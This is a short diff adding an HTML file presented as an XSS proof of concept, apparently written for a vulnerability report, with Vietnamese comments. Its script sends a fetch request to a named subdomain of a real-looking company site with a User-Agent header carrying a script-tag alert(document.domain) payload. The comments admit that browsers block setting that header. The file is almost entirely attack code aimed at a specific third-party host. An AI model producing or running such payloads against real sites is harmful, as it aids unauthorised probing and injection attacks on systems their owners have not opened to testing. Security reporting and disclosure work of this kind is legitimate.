@@ -1,0 +1,15 @@
+<html>
+  <body>
+    <h1>XSS PoC via User-Agent / Accept-Language</h1>
+    <script>
+      // Demo gửi request có User-Agent độc hại bằng fetch + proxy (trình duyệt sẽ chặn, 
+      // nhưng có thể giải thích trong report)
+      fetch("https://appcenter-doco-tam.audi.de/@.php", {
+        method: "GET",
+        headers: {
+          "User-Agent": "<script>alert(document.domain)</script>"
+        }
+      });
+    </script>
+  </body>
+</html>
